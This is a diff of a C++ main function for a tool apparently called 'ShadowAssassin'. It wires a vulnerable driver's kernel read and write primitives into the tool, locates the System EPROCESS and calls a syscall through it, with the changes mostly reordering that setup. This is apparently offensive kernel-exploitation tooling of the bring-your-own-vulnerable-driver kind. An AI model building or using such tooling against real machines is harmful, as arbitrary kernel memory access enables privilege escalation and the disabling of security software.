@@ -22,6 +22,8 @@ int main() {
     DbgLog("=== ShadowAssassin init ===\n");
 
     VulnerableDriver driver;
+    ShadowAssassin assassin;
+
     driver.EnablePrimitives();
 
     if (!driver.primitivesEnabled) {
@@ -30,7 +32,10 @@ int main() {
     }
     DbgLog("[main] Primitives enabled\n");
 
-    UINT64 eprocess = driver.GetEPROCESS();
+    assassin.SetReadPrimitive([&](UINT64* dst, UINT64 addr, UINT64 size) { driver.Read(dst, addr, size); });
+    assassin.SetWritePrimitive([&](UINT64 addr, UINT64 data) { driver.Write(addr, data); });
+
+    UINT64 eprocess = assassin.Get_System_EPROCESS();
 
     if (!eprocess) {
         DbgLog("[main] FAIL: GetEPROCESS returned 0\n");
@@ -38,17 +43,20 @@ int main() {
         return 1;
     }
 
-    ShadowAssassin assassin;
-
-    assassin.SetReadPrimitive([&](UINT64* dst, UINT64 addr, UINT64 size) { driver.Read(dst, addr, size); });
-    assassin.SetWritePrimitive([&](UINT64 addr, UINT64 data) { driver.Write(addr, data); });
     assassin.SetEPROCESS(eprocess);
 
     bool ok = assassin.Initialize();
     DbgLog("[main] Initialize() = %s\n", ok ? "OK" : "FAIL");
 
 
+
+
 	assassin.CallSyscall("NtQuerySystemInformation", { 0, 0, 0, 0 });
+
+
+
+
+
 
 /*    Sleep(100);
     __debugbreak();*/
